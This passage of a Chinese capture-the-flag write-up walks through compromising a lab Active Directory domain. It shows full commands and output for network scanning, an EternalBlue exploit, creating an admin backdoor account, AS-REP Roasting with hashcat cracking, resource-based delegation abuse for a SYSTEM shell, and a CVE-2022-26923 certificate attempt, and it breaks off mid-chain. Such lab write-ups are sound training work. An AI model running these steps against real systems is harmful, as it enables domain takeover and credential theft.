<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ ./fscan -h 172.22.15.26/16 -time 10</span><br><span class="line"> ___                              _</span><br><span class="line">  / _ \     _ __  __ _ _ __ __ _  _ __| | __</span><br><span class="line"> / /_\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_ ____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \_ _,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.15.13    is alive</span><br><span class="line">(icmp) Target 172.22.15.18    is alive</span><br><span class="line">(icmp) Target 172.22.15.24    is alive</span><br><span class="line">(icmp) Target 172.22.15.35    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.15.24:3306 open</span><br><span class="line">172.22.15.35:445 open</span><br><span class="line">172.22.15.13:445 open</span><br><span class="line">172.22.15.18:445 open</span><br><span class="line">172.22.15.35:139 open</span><br><span class="line">172.22.15.24:139 open</span><br><span class="line">172.22.15.18:139 open</span><br><span class="line">172.22.15.13:139 open</span><br><span class="line">172.22.15.35:135 open</span><br><span class="line">172.22.15.24:135 open</span><br><span class="line">172.22.15.13:135 open</span><br><span class="line">172.22.15.18:135 open</span><br><span class="line">172.22.15.24:80 open</span><br><span class="line">172.22.15.18:80 open</span><br><span class="line">172.22.15.24:445 open</span><br><span class="line">172.22.15.13:88 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.24</span><br><span class="line">   [-&gt;] XR-WIN08</span><br><span class="line">   [-&gt;] 172.22.15.24</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.35</span><br><span class="line">   [-&gt;] XR-0687</span><br><span class="line">   [-&gt;] 172.22.15.35</span><br><span class="line">[*] NetBios: 172.22.15.35    XIAORANG\XR-0687</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.18</span><br><span class="line">   [-&gt;] XR-CA</span><br><span class="line">   [-&gt;] 172.22.15.18</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.15.13</span><br><span class="line">   [-&gt;] XR-DC01</span><br><span class="line">   [-&gt;] 172.22.15.13</span><br><span class="line">[+] 172.22.15.24 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] 172.22.15.13  (Windows Server 2016 Standard 14393)</span><br><span class="line">[*] NetBios: 172.22.15.13    [+]DC XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393</span><br><span class="line">[*] NetBios: 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] WebTitle: http://172.22.15.18       code: 200 len: 703    title: IIS Windows Server</span><br><span class="line">[*] NetBios: 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393</span><br><span class="line">[*] WebTitle: http://172.22.15.24       code: 302 len: 0      title: None 跳转 url: http://172.22.15.24/www</span><br><span class="line">[*] WebTitle: http://172.22.15.24/www/sys/index.php code: 200 len: 135    title: None</span><br><span class="line">[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detect</span><br><span class="line">已完成 16/16</span><br><span class="line">[*] 扫描结束, 耗时: 23.238579924s</span><br></pre></td></tr></table></figure>

<p>可以发现 172.22.15.24 存在 MS17-010 漏洞，直接上 msf，但是用 msf 梭哈之前需要先搭建一层代理，可以用 Venom 搭建很方便</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 172.22.15.24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>flag02 在 C:\users\administrator\flag 里，添加一个新用户然后远程桌面连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user ll Asd123123 /add</span><br><span class="line">net localgroup administrators ll /add</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%982.png"></p>
<p>可以看到数据库的密码，这个站点还存在一个 phpmyadmin，尝试登录 <code>root:root@#123</code>，将 zdoo 库里面的 user 表导出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#域内用户</span><br><span class="line">lixiuying@xiaorang.lab</span><br><span class="line">jiaxiaoliang@xiaorang.lab</span><br><span class="line">wanglihong@xiaorang.lab</span><br><span class="line">huachunmei@xiaorang.lab</span><br><span class="line">zhangxinyu@xiaorang.lab</span><br><span class="line">huzhigang@xiaorang.lab</span><br><span class="line">lihongxia@xiaorang.lab</span><br><span class="line">wangyulan@xiaorang.lab</span><br><span class="line">chenjianhua@xiaorang.lab</span><br><span class="line">zhangyi@xiaorang.lab</span><br><span class="line">zhangli@xiaorang.lab</span><br><span class="line">zhangwei@xiaorang.lab</span><br><span class="line">liuqiang@xiaorang.lab</span><br><span class="line">wangfang@xiaorang.lab</span><br><span class="line">wangwei@xiaorang.lab</span><br><span class="line">lixiaoliang@xiaorang.lab</span><br><span class="line">wanghao@xiaorang.lab</span><br></pre></td></tr></table></figure>

<p>将获得的账号放进 user.txt 里</p>
<p>使用 AS-REP Roasting 攻击，尝试获取用户的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile users.txt -format hashcat</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">/usr/share/doc/python3-impacket/examples/GetNPUsers.py: 165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)</span><br><span class="line">$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:28dc48860e014c6d18a29bad65ba6cc8$ b6924f808e7a4d56bd403bc0e5286ad6b1cb1a39ee59331e484a90801fa82bbcb6b685236b61c5976a05330006b74f304fcfb56793de9c78d38caa16075bef947ad898c8b1130dad240a8298a98e86f18af90cebb015502c7758d6a32c366a42395d08877902d303ee0662540653b3c87c14d6d5319b63e5c5eaf6250d7e82d48d57afc56492344b618b054d6a75cf5ee014f00e92311479dba0ccb54c77b072213a42b79862f913a77a6b0fae4f9a67755ca83b583220c30b6f77296098c71bb42a2cbd8197bcd4e30598ecfbf519899b44cc5d723a4a49fc26db1a4b678a1afd4acea4b42b72949e677edd</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:2fad79d14745c573303bd34c39f80e7f$ 0d9522fc4669f0e04b80e36cef3370c1cce5e232e2b131d6d652c7e2dad452a86918cfbd25e78a701896943ba6b50e241f27b8af4b5d79cffef11fd4ee2392325a468f8ff648e70a74e7d9d2ce58990dc91b36a5c84c2ffa7f45e7cdd852dc2a8df1e5e2f9491eb5c5753cdf54cac6cc2eed2a8b9b58c3693b058fcb6a6187ae49c4d80732aa40e0e3296313962128d414b85f75cb87af301ca39664fffc192e1b62755178c4c6b8f13dd70ff912c4f637a970f33bc367e84e4c1dcb31ade4a20b0bdf8bd7c64c19adf091f4850a8ea2c7a7428bbcb17ef7c87e02ae3b5f9637902612ba8fbe65b7599a7d7e</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User lihongxia@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User wangyulan@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User chenjianhua@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br></pre></td></tr></table></figure>

<p>返回了两个票据, 用 hashcat 爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat -m 18200 user.txt /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:dbd1dee4c07eea9541a9f1af91b93180$ b4d238908b8d37009f9dfb5402a13f1b60567f4f8185fbbf5c9fbefe14bbe0b1f89980cd604ff68b572afe6af2d1bb4d6720abc8bdc51e47df9da3ebb4801d08f8be90c12343699eff8855dbfc0d63e796ffcec62169fa4e3ee97440ca0eb2eb985e6785f93aa1d34444235b1ce8937acf0121fe05ec2c589ba625fab1c90bd168637124f99378007fa9c459b07f946a65d3c7131cdad16af4b591becc04526125e2c255072df4a32214d393aab5f27cff28b66859c1b9bb06600d4c7a51cd7ae583d4602fd1ebd6ffc269ee60ed861abb28bb547de5e848955d5279d9e08523edb67fbd171d1af1730f2fba: winniethepooh</span><br><span class="line">$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:c640ad4dd669f00b128bad8d1ef8df86$ 0b8e74c7b36ec7daceb707ce176d18a8d15f8cd3ba3154f8ae4f29e9e54f538ab19bc766ea554698677d7f1e6f9418fd7419d82a1ca79582ed70f3de5b5c771a6e7df373fc84a9921b697e7c7d42c17e85f1b2ae73b1ec15bf1bbc59e20bfb2d4e5e52c53c1e88da9c0815434acd8298948f7becb0f15bfdcce4153d025570249523f7507c20f694f5e0ec23c8e7ef5d446aa5fec15315ab314658fc36befc39d7cdf037fa1f165a83ab257fa34a17c4b512ccca27284b97d8f7bdf51cdb0a069e2df4f952c3c52fa47fb58a0fe4e80d0907062fad92edf4d799306ddb103468accf1c2a6b172f2bd7d7c61d: 1qaz2wsx</span><br></pre></td></tr></table></figure>

<p>用 bloodhound 进行域内信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -dc XR-DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.15.13 --auth-method ntlm --zip</span><br><span class="line">INFO: Found AD domain: xiaorang.lab</span><br><span class="line">INFO: Connecting to LDAP server: XR-DC01.xiaorang.lab</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 3 computers</span><br><span class="line">INFO: Connecting to LDAP server: XR-DC01.xiaorang.lab</span><br><span class="line">INFO: Found 37 users</span><br><span class="line">INFO: Found 53 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: XR-CA.xiaorang.lab</span><br><span class="line">INFO: Querying computer: XR-0687.xiaorang.lab</span><br><span class="line">INFO: Querying computer: XR-DC01.xiaorang.lab</span><br><span class="line">INFO: Done in 00M 05S</span><br><span class="line">INFO: Compressing output into 20250402040344_bloodhound.zip</span><br></pre></td></tr></table></figure>

<p>域用户 LIXIUYING 对计算机 XR-0687$ 具有 Generic Write 权限</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%983.png"></p>
<p>可以通过修改目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性（配置 RBCD）获取目标 SYSTEM 权限。</p>
<p>添加一个机器用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-addcomputer -computer-name &#x27;EVILCOMPUTER$&#x27; -computer-pass &#x27;123@#ABC&#x27; -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 &quot; xiaorang.lab/lixiuying: winniethepooh &quot;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Successfully added machine account EVILCOMPUTER$ with password 123@#ABC.</span><br></pre></td></tr></table></figure>

<p>然后配置 RBCD：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-rbcd xiaorang.lab/lixiuying: winniethepooh -action write -delegate-from &quot;EVILCOMPUTER $&quot; -delegate-to &quot;XR-0687$&quot; -dc-ip 172.22.15.13</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class="line">[*] Delegation rights modified successfully!</span><br><span class="line">[*] EVILCOMPUTER $ can now impersonate users on XR-0687$ via S4U2Proxy</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     EVILCOMPUTER$   (S-1-5-21-3745972894-1678056601-2622918667-1147)</span><br></pre></td></tr></table></figure>

<p>请求并冒充域管权限的服务票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-getST xiaorang.lab/EVILCOMPUTER$:&#x27;123@#ABC&#x27; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT for user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow()</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow()</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket in Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─#  export KRB5CCNAME = Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-psexec &#x27;xiaorang.lab/administrator@XR-0687.xiaorang.lab&#x27; -target-ip 172.22.15.35 -codec gbk -no-pass -k</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.22.15.35.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file RHzxEZPZ.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.15.35.....</span><br><span class="line">[*] Creating service etRo on 172.22.15.35.....</span><br><span class="line">[*] Starting service etRo.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [版本 10.0.20348.1668]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Windows\system32 &gt;</span><br></pre></td></tr></table></figure>

<p>flag03 在 C:\users\Administrator\flag\</p>
<p>主机 172.22.15.18 (XR-CA) 存在 <code>CVE-2022-26923</code> 漏洞</p>
<p>打 CVE-2022–26923</p>
<p>查找证书服务器，并尝试查找可以利用的证书模板：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -vulnerable -stdout</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA: Could not connect: [Errno 111] Connection refused</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused</span><br><span class="line">[!] Failed to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27;</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : xiaorang-XR-CA-CA</span><br><span class="line">    DNS Name                            : XR-CA.xiaorang.lab</span><br><span class="line">    Certificate Subject                 : CN = xiaorang-XR-CA-CA, DC = xiaorang, DC = lab</span><br><span class="line">    Certificate Serial Number           : 3ECFB0112E93BE9041059FA6DBB3C35A</span><br><span class="line">    Certificate Validity Start          : 2023-06-03 07:19:59+00:00</span><br><span class="line">    Certificate Validity End            : 2028-06-03 07:29:58+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Unknown</span><br><span class="line">    Request Disposition                 : Unknown</span><br><span class="line">    Enforce Encryption for Requests     : Unknown</span><br><span class="line">Certificate Templates                   : [!] Could not find any certificate templates</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 certipy 创建一个机器账户，并将该机器账户 dNSHostName 属性指向域控：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user &#x27;EVILCOMPUTER2$&#x27; -pass &#x27;123@#ABC&#x27; -dns &#x27;XR-DC01.xiaorang.lab&#x27;</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Creating new account:</span><br><span class="line">    sAMAccountName                      : EVILCOMPUTER2$</span><br><span class="line">    unicodePwd                          : 123@#ABC</span><br><span class="line">    userAccountControl                  : 4096</span><br><span class="line">    servicePrincipalName                : HOST/EVILCOMPUTER2</span><br><span class="line">                                          RestrictedKrbHost/EVILCOMPUTER2</span><br><span class="line">    dnsHostName                         : XR-DC01.xiaorang.lab</span><br><span class="line">[*] Successfully created account &#x27;EVILCOMPUTER2$&#x27; with password &#x27;123@#ABC&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用该机器账户向 AD CS 服务器请求域控机器的证书模板：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad req -u EVILCOMPUTER2\$@xiaorang.lab -p &#x27;123@#ABC&#x27; -target 172.22.15.18 -ca &quot;xiaorang-XR-CA-CA&quot; -template Machine</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 7</span><br><span class="line">[*] Got certificate with DNS Host Name &#x27;XR-DC01.xiaorang.lab&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;xr-dc01.pfx&#x27;</span><br></pre></td></tr></table></figure>

<p>用申请到的证书，申请域控的 TGT：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: xr-dc01$@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</span><br></pre></td></tr></table></figure>

<p>使用 certipy 请求 TGT 失败，出现 <code>KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</code> 错误。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a> 使用证书进行认证，配置 RBCD 进行攻击：</p>
